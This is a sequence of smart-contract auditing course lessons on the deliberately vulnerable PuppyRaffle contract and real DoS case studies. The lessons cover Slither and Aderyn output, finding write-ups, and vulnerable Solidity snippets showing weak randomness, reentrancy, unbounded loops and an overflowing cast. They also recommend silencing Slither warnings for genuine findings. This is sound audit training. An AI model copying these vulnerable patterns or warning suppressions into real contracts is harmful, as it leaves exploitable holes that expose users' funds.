Were this a private audit, I may start an `Informational` section in my `notes.md`.

```
## About

> The project allows users to enter a raffle to win a dog NFT.

## Informational

`PuppyRaffle::entranceFee` is immutable and should follow a more clear naming convention

    ie. `i_entranceFee` or `ENTRANCE_FEE`
```

> **Pro-tip:** In VS Code you can use these keyboard shortcuts to navigate between previous and next cursor positions:
>
> - Windows: `Alt + Left/Right Arrow`
> - Mac:
>   - Previous - `Control + '-'`
>   - Next - `Control + Shift + '-'`

### Wrap Up

We're going to be bouncing between `Recon` and `Vulnerability` phases a bit in the Puppy Raffle review. Sometimes the lines can be a little blurry, but you'll find a workflow that works well for you with time and experience.

Let's go back to the code.
---
title: Slither Walkthrough
---

_Follow along with this video:_

---

### Slither Static Analysis

Alright, let's take a closer look at some of the issues Slither was able to find in our code base earlier. These will include, but aren't limited to, each of these.

- Using incorrect Solidity versions
- Missing/wrong events
- Event reentrancy
- Zero address checks
- Supply chain attacks
- Cache storage variables for loops
- Unchanged variables marked as immutable or constant

Start by running `slither .` just as before and let's dive into the output starting at the most severe

### Slither Highs



**1. Sends Eth to Arbitrary User**

- Dangerous Calls: `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#160)`

Taking a look at this call in our code base, we see it's in the `withdrawFees` function.

```js
function withdrawFees() external {
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    // (bool success,) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

So, `Slither` is telling us that our feeAddress is arbirary and may be malicious. Let's look at the attack vector in the [**`Slither` documentation**](https://github.com/crytic/slither/wiki/Detector-Documentation#functions-that-send-ether-to-arbitrary-destinations).

The documentation outlines that since our `feeAddress` can be changed, whomever receives funds from `withdrawFees` could theoretically be anybody. However, in `PuppyRaffle`, the `feeAddress` can only be changed by the `owner`, so this would be considereed intention in our protocol.

```js
function changeFeeAddress(address newFeeAddress) external onlyOwner {
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```

Conveniently, by using the syntax `// slither-disable-next-line [DETECTOR_NAME]`, we can tell Slither to ignore this warning:

```js
// slither-disable-next-line arbitrary-send-eth
(bool success,) = feeAddress.call{value: feesToWithdraw}("")
```

**2. Uses a Weak PRNG**

- Dangerous Calls:
  - `winnerIndex = uint256(keccak256(bytes)(abi.encodePacked(msg.sender,block.timestamp,block.difficulty))) % players.length (src/PuppyRaffle.sol#127-128)`

This is the same vulnerability we detected! We can have slither ignore this line with:

```js
// slither-disable-next-line weak-prng
uint256 winnerIndex =
uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
```

### Slither Mediums



**1. Performs a Multiplication on the Result of a Division**

- Dangerous Calls:
  - `encodedLen = 4 * ((data.length + 2) / 3) (lib/base64/base64.sol#22)`
  - `decodedLen = (data.length / 4) * 3 (lib/base64/base64.sol#78)`

These issues are actually being detected in one of the libraries we're using, `Base64`. For the purposes of this section, we won't be going through our libraries, but what I want you to take away is that we need to assure our libraries, inheritances and dependencies are compatible, and these are generally warnings that are worth investigation.

You can have slither ignore these by navigating to `lib/base64/base64.sol#22` and `lib/base64/base64.sol#78` to prepend the line:

```js
// slither-disable-next-line divide-before-multiply
```

**2. Uses a Dangerous Strict Equality**

- Dangerous Calls:
  - `require(bool,string)(address(this).balance == uint256(totalFees),PuppyRaffle: There are currently players active!) (src/PuppyRaffle.sol#158)`

This is another one we caught during our manual review! The warning here is pointing to our previous `Mishandling of Eth` finding.

We can have slither ignore this warning with:

```js
// slither-disable-next-line incorrect-equality
```

**3. Reentrancy in PuppyRaffle.refund(uint256)**

- Dangerous Calls:
  - External calls:
    - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#102)`
  - State variables written after the call(s):
    - `players[playerIndex] = address(0) (src/PuppyRaffle.sol#104)`

We found this one too! Don't get me started talking about reentrancy again. Know it, protect against it.

You can have `Slither` ignore this one by adding this to the line before our external call:

```js
// slither-disable-next-line reentrancy-no-eth
payable(msg.sender).sendValue(entranceFee);
```

**4. Ignores Return Value by {function call}**

- Dangerous Calls:
- 
  Call Summary

  - `(tokenId) = _tokenOwners.at(index) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#181)`

  - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#339)`
  - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#341)`
  - `_holderTokens[owner].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#369)`
  - `_tokenOwners.remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#371)`
  - `_holderTokens[from].remove(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#396)`
  - `_holderTokens[to].add(tokenId) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#397)`
  - `_tokenOwners.set(tokenId,to) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#399)`
  

---

You can remove these warning from your `Slither` report by navigating to the respective lines for each call in the library and adding:

```js
// slither-disable-next-line unused-return
```

### Slither Lows



**1. Lacks a Zero Check**

- Dangerous Calls:
  - `feeAddress = _feeAddress (src/PuppyRaffle.sol#63)`
  - `feeAddress = newFeeAddress (src/PuppyRaffle.sol#170)`

`feeAddress` is assigned in our `constructor` and the `changeFeeAddress` function. `Slither` is advising that we include a check to assure the `feeAddress` isn't being set to `address(0)`.

That sounds like a valid informational finding to me. Let's add it to our notes above each function!

```js
// @Audit: Info - check for zero address when setting feeAddress
```

These sorts of finds are often referred to as `input validation` and the severity is typically deemed informational.

We can have our `Slither` report remove these warnings once we've made note of them, but adding this line to `PuppyRaffle` before assigning our `feeAddress` in our `constructor` and the `changeFeeAddress` functions:

```js
// slither-disable-next-line missing-zero-check
```

**2. Reentrancy in PuppyRaffle.refund/selectWinner**

- Dangerous Calls: - 
  Call Summary
  PuppyRaffle.refund

          - `address(msg.sender).sendValue(entranceFee) (src/PuppyRaffle.sol#103)`

          PuppyRaffle.selectWinner

          -  `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#152)`
          - `_safeMint(winner,tokenId) (src/PuppyRaffle.sol#154)`
          - `returndata = to.functionCall(abi.encodeWithSelector(IERC721Receiver(to).onERC721Received.selector,_msgSender(),from,tokenId,_data),ERC721: transfer to non ERC721Receiver implementer) (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#447-450)`
          - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#119)`
        

        ---

  Now, you may be asking yourself _These are reentrancy, why aren't they high!?_.

Well, these warnings are specifically pointing to the vulnerability described by the manipulation of the order or value of events being emitted. By reentering these functions an attacker is able to manupulate the events being emitted and potentially compromise third party reliance on them.

There's a lot of debate about what kind of severity should be ascribed to event based findings, but my personal rule of thumb is that they are _at least_ `Low Severity`. Examples include:

- If an event can be manipulated
- If an event is missing
- If an event is wrong

I would add these to my notes for an audit report.

```js
// @Audit: Low - Events affected by reentrancy
```

We can remove these warnings from `Slither` by navigating to the reported lines and adding the following as appropriate:

```js
// slither-disable-next-line reentrancy-events
```

In your refund function, you may try to disable 2 checks for the same line. In order to do this, separate your ignore directives with a comma:

```js
// slither-disable-next-line reentrancy-no-eth, reentrancy-events
```

**3. Uses Timestamp for Comparisons**

- Dangerous Calls:
  - `require(bool, string)(block.timestamp >= raffleStartTime + raffleDuration, PuppyRaffle: Raffle not over) (src/PuppyRaffle.sol#136)`

Technically relying on `block.timestamp` means this _would_ be vulnerable to manipulation, but realistically only by a few seconds. For the purposes of this section we'll ignore it for now.

You can have `Slither` ignore it too with:

```js
// slither-disable-next-line timestamp
```

**4. Uses Assembly**

- Dangerous Calls:
  - `INLINE ASM (lib/base64/base64.sol#28-63)`
  - `INLINE ASM (lib/base64/base64.sol#84-126)`
  - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#33)`
  - `INLINE ASM (lib/openzeppelin-contracts/contracts/utils/Address.sol#180-183)`

In short - Slither doesn't like Assembly. We'll be going over Assembly much later in this course, for now we'll be ignoring these warnings.

You can remove these detectors/warnings by adding the following to the appropriate lines:

```js
// slither-disable-next-line assembly
```

**5. Different Versions of Solidity Are Used**

- Dangerous Calls:

  - 
      Call Summary

    - `Version used: ['>=0.6.0', '>=0.6.0=0.6.2<0.8.0', '^0.7.6']`
    - `>=0.6.0 (lib/base64/base64.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/access/Ownable.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/ERC165.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/introspection/IERC165.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/math/SafeMath.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Context.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableMap.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/EnumerableSet.sol#3)`
    - `>=0.6.0<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Strings.sol#3)`
    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721.sol#3)`
    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Enumerable.sol#3)`
    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Metadata.sol#3)`
    - `>=0.6.2<0.8.0 (lib/openzeppelin-contracts/contracts/utils/Address.sol#3)`
    - `^0.7.6 (src/PuppyRaffle.sol#2)`

  

This is where `Slither` is pointing out the `Floating Pragma` vulnerability we outlined earlier. This will definitely be going in our report as an informational finding.

Unfortunately `Slither` doesn't offer a per-file or line disabling of this detector, but we can remove it by adding the following to a `.slither.config.json` that we create:

```js

"detectors_to_exclude":[
    "solc-version"
]

```

Then add this line to the appropriate files:

```js
// slither-disable-next-line pragma,solc-version
```

**6. solc 0.7.6 is not Recommended for Deployment**

- Dangerous Calls:
  - `PuppyRaffle.sol solc version 0.7.6`

Slither's documentation tells us that this is an old version of Solidity and that we're not taking advantage of Solidity updates or new security checks. This is a great finding and should definitely be added to our report.

```js
// @Audit: Info - Should use updated solv version such as 0.8.18
```

**7. {function} is Never Used and Should be Removed**

- Dangerous Calls
  - `PuppyRaffle._isActivePlayer() (src/PuppyRaffle.sol#180-187)`

We called this one out as an informational/gas finding as well. You can disable this detector in `Slither` by adding this line above the function:

```js
// slither-disable-next-line dead-code
```

**8. Low Level Call**

- Dangerous Calls:

  - 
    Call Summary

    - `(success) = recipient.call{value: amount}() (lib/openzeppelin-contracts/contracts/utils/Address.sol#60)`
    - `(success,returndata) = target.call{value: value}(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#128)`
    - `(success,returndata) = target.staticcall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#156)`
    - `(success,returndata) = target.delegatecall(data) (lib/openzeppelin-contracts/contracts/utils/Address.sol#183)`
    - `(success) = winner.call{value: prizePool}() (src/PuppyRaffle.sol#154)`
    - `(success) = feeAddress.call{value: feesToWithdraw}() (src/PuppyRaffle.sol#167)`
    

---

Much like Assembly, `Slither` doesn't like low level calls. We'll be ignoring these for now, but you can remove them from your warnings by applying this line above the described calls.

```js
// slither-disable-next-line low-level-calls
```

**9. Not in mixedCase**

- Dangerous Calls:
  - `Parameter Base64.decode(string)._data (lib/base64/base64.sol#68)`
  - `Parameter ERC721.safeTransferFrom(address,address,uint256,bytes)._data (lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol#247)`

These are simply pointing out naming convention concerns in a couple of our libraries. We'll ignore these as well, but you can remove them from the `Slither` warnings with:

```js
// slither-disable-next-line naming-convention
```

**10. Redundant Expression**

- Dangerous Calls:
  - `"this (lib/openzeppelin-contracts/contracts/utils/Context.sol#21)" inContext (lib/openzeppelin-contracts/contracts/utils/Context.sol#15-24)`

Another warning from a depedency of ours, we'll ignore this, but if you want to remove it you can add the line:

```js
// slither-disable-next-line redundant-statements
```

**11. Variable is Too Similar**

- Dangerous Calls
  - `Base64.TABLE_DECODE (lib/base64/base64.sol#10-13) is too similar to Base64.TABLE_ENCODE (lib/base64/base64.sol#9)`

**_ANOTHER_** warning from the libraries we're using. We can remove it with this line:

```js
// slither-disable-next-line similar-names
```

Now, at this point, you're probably annoyed by all the libraries `Slither` has been catching things in. What if I told you there's a better way to exclude them all at once?!

By running `Slither . --exclude-dependencies` we can actually run our tool and have it ignore anything detected in our imports!

**12. Cached Array Length**

- Dangerous Calls:
  - `Loop condition j < players.length (src/PuppyRaffle.sol#90)`
  - `Loop condition i < players.length (src/PuppyRaffle.sol#114)`
  - `Loop condition i < players.length (src/PuppyRaffle.sol#182)`

Here's a vulnerability we missed!

Any time we're looping through players.length in this way, we're using far more gas than should be necessary. We should cache this value so we're only calling it from storage once.

```js
// @Audit: We should cache the players.length array when looping - uint256 playersLength = players.length;
```

We can remove this warning from the `Slither` report by adding this line before our loops:

```js
// slither-disable-next-line cache-array-length
```

**13. Storage Variables can be Declares Constant**

- Dangerous Calls:
  - `PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#40)`
  - `PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#50)`
  - `PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#45)`

A great finding, absolutely these storage variables should be constants, we're setting them once and they never change, a big potential gas savings.

```js
// @Audit: These Storage Variables can be Constants
string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8"
string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
```

We can filter these warnings from our `Slither` report with the line:

```js
// slither-disable-next-line
```

**14. State Variables can be Immutable** - Dangerous Calls: - `PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#25)`

Likewise, this is a great call by `Slither` our raffleDuration is being set once and cannot be changed. Setting this to immutable would offer additional gas savings. Absolutely added to the report.

```js
// @Audit: Unchanging state variables can be declared as immutable
uint256 public raffleDuration;
```

This warning can be removed from the `Slither` report with:

```js
// slither-disable-next-line immutable-states
```

### Wrap Up

Wow. This may have seemed a bit tedious, but look how much we've found and how much better we understand what `Slither` is able to detect. `Slither`, if nothing else, is great at finding gas optimizations, but beyond that it found issues we thought we needed to manually review for.

Had PuppyRaffle ran `Slither` before coming to audit, their code base would have been in a much better starting place.

Up next, let's see what `Aderyn` can do for Puppy Raffle!
---
title: Reporting - Weak Randomness
---

_Follow along with this video:_

---

### Weak Randomness

Our next marked finding was also in `selectWinner` and is referencing weak randomness.

```js
function selectWinner() external {
    uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        ...
        uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
}
```

Lets consider what the severity of this would be by assessing the Impact and Likelihood.

- **Impact:** High - If someone is able to predict the outcome of a raffle and exploit this knowledge, this fundamentally breaks this protocol's functionality.
- **Likelihood:** High - A user has a lot of incentive to assure they win, and assure their token is rare. It's very likely this would be exploited.

Our assessment pretty clearly points to this finding being of `High Severity`. Fortunately in previous lessons we already wrote a Proof of Concept for this, so let's take our finding template and start filling it in.

```
**Title:**
### [H-2] Weak Randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block,timestamp` and `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

**Note:** This additionally means users could front-run this function and call `refund` if they see they are not the winner.
```

We'll talk more about front-running and MEV concerns later in the course, but know this exposes a vulnerability of this type here too.

What's the impact of this?

```
**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the `rarest` puppy. Making the entire raffle worthless if a gas war to choose a winner results.
```

For our Proof of Concept, lets begin by outlining the details of exploiting this vulnerability. This attack vector is well known, so I might be cheating a little bit by linking to a reference of this exploit - but I challenge you to write a test that proves this vulnerability!

```
**Proof of Concept:**

1. Validators can know the values of `block.timestamp` and `block.difficulty` ahead of time and usee that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner!
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.
```

Anyone who knows me, or as seen any of my other content knows what my recommendation is going to be!

```
**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as [Chainlink VRF](https://docs.chain.link/vrf)
```

That's one more down! Our next finding to write up is `Magic Numbers`!
---
title: DoS - Case Study
---

_Follow along with this video:_

---

### Live DoS Examples

In this lesson, we delve into two different kinds of **Denial of Service Attacks** or **DoS attacks** as they were uncovered from real security reviews. Owen, the founder of Guardian Audits, will share insights from his work, showing us how these vulnerabilities arise and the best frameworks to uncover them.

### Introduction to Owen

The case studies we'll be covering today are brought to us by Owen - the Founder of Guardian Audits. Guardian Audits was founded 2 years ago and has since made Web3 more secure by uncovering hundreds of vulnerabilities.

In this lesson, Owen provides a breakdown of audits in which DoS vulnerabilities were uncovered and we're greatly appreciative to Owen for his contributions. 🙏

## Case Study 1: Bridges Exchange

The first DoS vulnerability we'll touch on was found in the dividends distribution system of the Bridges exchange.

### Attack Mechanics

The issue arises from an `unbounded for-loop` in the `distributeDividends` function, resulting in the risk of a DoS attack. An ill-intentioned party can cause the distribute dividends function to violate the block gas limit, effectively blocking all dividends by continually generating new addresses and minting minimal quantities of the Bridges pair token.

Let's look at the code.

```js
function distributeDividends(uint amount) public payable lock {
   require(amount == msg.value, "don't cheat");
   uint length = users.length;
   amount = amount.mul(magnitude);
   for (uint i; i < length; i++){
      if(users[i] != address(0)){
         UserInfo storage user = userInfo[users[i]];
         user.rewards += (amount.mul(IERC20(address(thiss).balanceOf(users[i])).div(totalSupply.sub(MINIMUM_LIQUIDITY))));
      }
   }
}
```

We can see the `unbounded for-loop` above. This is looping through an array, `users[]`, the length of which has no limits.

The practical effect of this is that, were the length of the `users[]` array long enough, the gas required to call this function would be prohibitively expensive. Potentially hitting block caps and being entirely uncallable.

### Confirming the Attack Vector

In order to verify this is a vulnerability. We should invesitgate under what circumstances the `user[]` array can be added to.

By searching for the variable we see the array is appended to in the mint function:

```js
function mint(address to) external lock returns (uint liquidity){
   ...
   if(IERC20(address(this).balanceOf(to) == 0)){
      users.push(to);
   }
}
```

In theory, an attacker could generate new wallet addresses (or transfer the minted tokens) to call this function repeatedly, bloating the array and DOSing the function.

The resolution for the Bridges Exchange was to refactor things such that the `for-loop` wasn't needed.

## Case Study 2: Dos Attack in GMX V2

The second instance of a DoS attack shows up in the GMX V2 system and is entirely different than the Bridges Exchange case mentioned above.

### Attack Mechanics

The problem arises from a boolean indicator called `shouldUnwrapNativeToken`. This flag can be leveraged to set up positions that can't be reduced by liquidations or ADL (Auto-Deleveraging) orders. When the native token unwraps (with the flag set to true), a position can be formed by a contract that can't receive the native token. This leads to order execution reverting, causing a crucial function of the protocol to become unexecutable.

### Into the Code

Let's investigate what this looks like in code.

Within the GMX V2 `DecreaseOrderUtils` library we have the `processOrder` function. While processing an order with this library we eventually will call `transferNativeToken` within `TokenUtils.sol`.

```js
function transferNativeToken(DataStore dataStore, address receiver, uint256 amount) internal {
   if (amount == 0) {return;}

   uint256 gasLimit = dataStore.getUint(keys.NATIVE_TOKEN_TRANSFER_GAS_LIMIT);

   (bool success, bytes memory data) = payable(receiver).call{value: amount, gas: gasLimit} ("");

   if (success){return;}

   string memory reason = string(abi.encode(data));
   emit NativeTokenTransferReverted(reason);

   revert NativeTokenTransferError(receiver, amount);
}

```

Ultimately, this is where the problem lies. When a position in the protocol is liquidated, or de-leveraged, and the `shouldUnwrapNativeToken` flag is true, this function is called in the process.

Were the `receiver` address a contract which was unable to receive value - the liquidation of the user would revert every time.

This is a critical flaw!

You may notice another potential vulnerability in the same function - the `gasLimit`. Were the receiver a contract address which expended unnecessary gas in it's receive function - this call would also revert!

### Wrap Up

To summarize, here are a couple things to keep an eye out for which may lead to DoS attacks:

1. **For-Loops**: Take extra caution with for-loops. Ask yourself these questions:
   - Is the iterable entity bounded by size?
   - Can a user append arbitrary items to the list?
   - How much does it cost the user to do so?
2. **External calls**: These can be anything from transfering Eth to calling a third-party contract. Evaluate ways these external calls could fail, leading to an incomplete transaction.

DoS attacks put simply are - the denial of functions of a protocol. They can arise from multiple sources, but the end result is always a transaction failing to execute.

Be vigilant for the above situations in your security reviews. Let's next look at what a PoC for Denial of Service is like.
---
title: Reporting - Missing Events And Remove Dead Code
---

_Follow along with this video:_

---

## Missing Events and Dead Code

There are definitely events missing in Puppy Raffle, but we'll keep this write up quick.

This will be an informational finding, as we discussed earlier. A write up for this is going to look something like so:

```
### [I-6] State Changes are Missing Events

A lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.

It is best practice to emit an event whenever an action results in a state change.

Examples:
- `PuppyRaffle::totalFees` within the `selectWinner` function
- `PuppyRaffle::raffleStartTime` within the `selectWinner` function
- `PuppyRaffle::totalFees` within the `withdrawFees` function
```

Additionally, a quick write is likely all that's required for the next finding we identified, which was that `_getActivePlayerIndex` was `dead code` and never actually used. This could be `Gas` or `Informational`.

````
### [I-7] _isActivePlayer is never used and should be removed

**Description:** The function PuppyRaffle::_isActivePlayer is never used and should be removed.

    ```diff
    -    function _isActivePlayer() internal view returns (bool) {
    -        for (uint256 i = 0; i < players.length; i++) {
    -            if (players[i] == msg.sender) {
    -                return true;
    -            }
    -        }
    -        return false;
    -    }
    ```
````
---
title: Reporting - Incorrect Solc Version
---

_Follow along with this video:_

---

### Incorrect Solc Version

The next finding we're going to write up is another `informational` it seems. We identified in an earlier lesson that Puppy Raffle is using an outdated version of Solidity!

In this circumstance, `Slither` caught this one for us. It can often be valuable to pull from the Slither Documentation for references and recommendations for these types of findings. To add this to our `findings.md` it would look something like this:

```
### [I-2] Using an Outdated Version of Solidity is Not Recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
Recommendation

**Recommendations:**

Deploy with any of the following Solidity versions:

    0.8.18

The recommendations take into account:

    Risks related to recent releases
    Risks of complex code generation changes
    Risks of new language features
    Risks of known bugs

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

```

I'll mention as well, I know we have a finding template - and we'll absolutely use it soon - but for informational findings, they're often simplistic enough that being less verbose is acceptable.

Next lesson - Next vulnerability!
---
title: Tooling - Slither
---

_Follow along with this video:_

---

### Leveraging our Tools

Auditing smart contracts is an arduous yet essential task in the blockchain realm. To facilitate this process, there are excellent tools to help auditors catch bugs efficiently. In this post, we'll explore two popular static analysis tools that can significantly speed up the auditing process: Slither and Aderyn. Having knowledge of these tools isn't just beneficial for auditors — anyone aiming to be a top developer should consider these tools as an essential part of their toolbox.

### Static Analysis - Boosting Your Auditing Efficiency



Static analysis is a method where code is checked for potential issues without actually executing it. Essentially, it's a way to "debug" your code by looking for specific keywords in a certain order or pattern.

The most widely used tools for this purpose include [**Slither**](https://github.com/crytic/slither), developed by the [**Trail of Bits**](https://www.trailofbits.com/) team, and a Rust-based tool that we've developed known as [**Aderyn**](https://github.com/Cyfrin/aderyn).

> **Note**: It's important to remember that these tools should be run before going for an audit.

### Slither - A Python-Powered Static Analysis Tool

Slither tops the charts as the most popular and potentially the most potent static analysis tool available. Built using Python, it offers compatibility with both Solidity and Vyper developments. An open-source project, Slither allows developers to add plugins via PR.

The Slither repo provides instructions on installation and usage.

I want to bring your attention to the [**Detectors**](https://github.com/crytic/slither/wiki/Detector-Documentation) section of the documentation.

This document lists _all_ the vulnerabilities that Slither is checking for and recommendations for them.

For example:



This could have helped us with PasswordStore! It's easy to see how valuable these tools can be in making our work easier and more efficient.

### Installing Slither

We won't go over the specifics of installation in this course. As intermediate developers, we should have some familiarity with this process.

Choose the installation method that works best for you (Options outlined here), and if you run into issues don't hesitate to ask an AI like [**Phind**](https://www.phind.com/search?home=true) or [**ChatGPT**](https://chat.openai.com). They're great at debugging installation problems.

> **Note:** In addition to Slither, you may need to install [**Python**](https://www.python.org/downloads/), if you haven't.

Once installed ensure everything is up-to-date with:

```bash
pip3 install --upgrade slither-analyzer
```

### Running Slither

The Slither documentation outlines usage for us. Slither will automatically detect if the project is a Hardhat, Foundry, Dapp or Brownie framework and compile things accordingly.

In order to run slither on our current repo we just use the command:

```bash
slither .
```

This execution may take some time, depending on the size of the codebase. If we run it on Puppy Raffle, we're going to get a _massive_ output of potential issues.

The output color codes potential issues:

- **Green** - Areas that are probably ok, may be `informational` findings, we may want to have a look
- **Yellow** - Potential issue detected, we should probably take a closer look
- **Red** - Signifant issues detected that should absolutely be addressed.

Here's an example of what some of these look like:



### Wrap Up

By leveraging Slither, audits become more efficient, making it a fantastic tool for developers who are looking to minimize the time they spend on debugging and maximize their protocol's security.

> Always remember, static analysis tools enhance our security review, they don't replace our manual efforts!
---
title: Reporting - Mishandling of Eth
---

_Follow along with this video:_

---

### Mishandling of Eth and MEV

Frankly, we're going to skip the write ups for these.

MEV issues, as I've mentioned, we'll go over later in the course, so we'll skip this for now.

As for Mishandling of Eth, we briefly touched on this earlier. The issue really boils down to this line:

```js
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

This requirement to withdraw leads to a number of potential pitfalls, including an inability to withdraw if the contract accounting becomes broken as well as opening the protocol up to griefing should a raffle always be open. Generally something we should inform the protocol of.
---
title: Reporting - Floating Pragma
---

_Follow along with this video:_

---

### Floating Pragma

The first finding we're going to add to our `findings.md` comes from our notes on `floating pragma`. Remember, we can look through the repo for notes we've left by searching for our `@Audit` tag.

This one should be easy for us as `Aderyn` caught it, and did most of the write up for us. Lets look at what `Aderyn` output.

````
## L-2: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

	```solidity
	pragma solidity ^0.7.6;
	```
````

At this point you may wish to copy the [**finding_layout.md**](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/audit-data/audit-data/finding_layout.md) template we've been following into your audit repo.

`Aderyn's` output actually looks really great. I personally would rate this as an informational, so I'm going to make a few changes/formatting adjustments, but ultimately this is what it's going to look like, easy!

````
### I-1: Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

	```solidity
	pragma solidity ^0.7.6;
	```
````

Be sure to note your finding as actioned in your code base notes, and lets move onto the next one!

```js
// report-written: use of floating pragma is bad!
```
---
title: sc-exploits-minimized
---

_Follow along with this video:_

---

### Exploits, but smaller

```js
// Check for duplicates
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
```

This code above is going to cause something called a Denial of Service or DOS.

In order to get a better understanding of this bug, let's look at a _minimized_ example of it. If you reference the [**sc-exploits-minimized**](https://github.com/Cyfrin/sc-exploits-minimized) repo, half way down you should see something like what's pictured below.



This is an amazing resource to test your skills in general and familiarize yourself with common exploits. Addionally the `src` folder of `sc-exploits-minimized` contains minimalistic examples of a variety of vulnerabilities as well.

For now, let's check out the [**Remix example**](https://remix.ethereum.org/#url=https://github.com/Cyfrin/sc-exploits-minimized/blob/main/src/denial-of-service/DoS.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.20+commit.a1b79de6.js) of the Denial of Service exploit in the next lesson.
---
title: Exploit - Integer Overflow
---

_Follow along with this video:_

---

### Continuing with selectWinner

We've only just started with the `selectWinner` function and we've already found another issue. Let's keep going and see if we can find more.

```js
function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        // @Audit: Why the calculationi for totalAmountCollected, why not address(this).balance?
        uint256 totalAmountCollected = players.length * entranceFee;
        // @Audit:80% prizePool, 20% fee. Is this correct? Arithmatic may lead to precision loss
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
        // @Audit: Total fees the owner should be able to collect. Why the casting? Overflow.
        totalFees = totalFees + uint64(fee);

        ...
```

Assessing the function snippet above I notice a few things that may be worth noting in our `notes.md` and/or by leaving in-line notes like shown.

```js
totalFees = totalFees + uint64(fee);
```

